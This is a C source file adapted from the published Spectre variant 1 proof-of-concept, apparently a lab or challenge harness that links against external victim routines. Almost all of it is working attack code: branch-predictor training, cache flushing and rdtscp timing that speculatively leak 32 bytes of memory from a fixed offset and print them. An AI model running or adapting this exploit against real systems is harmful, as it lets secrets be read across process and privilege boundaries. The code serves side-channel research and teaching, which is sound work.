#modified sample code from the paper, you may have to change CACHE_HIT_THRESHOLD

#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/********************************************************************
Victim code.
********************************************************************/

#define array1_size 128

extern void flush(size_t);
extern void vaccess(size_t);
extern void gaccess();
/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (150) //CHANGE ME

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			flush(i * 512); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			flush(131200);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			vaccess(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			size_t o = mix_i * 512;
			time1 = __rdtscp(&junk); /* READ TIMER */
			gaccess(o); /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (mix_i>=0x20 && mix_i<0x80 && time2 <= CACHE_HIT_THRESHOLD)
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if ((results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int user_main(int argc, const char* * argv)
{
	size_t malicious_x; /* default for malicious_x */
	int score[2], len = 32;
	uint8_t value[2];

    malicious_x = 136;
	while (--len >= 0)
	{
		readMemoryByte(malicious_x++, value, score);
		write(1, &value[0], 1);
	}
    char nl = '\n';
    write(1, &nl, 1);	
    return (0);
}
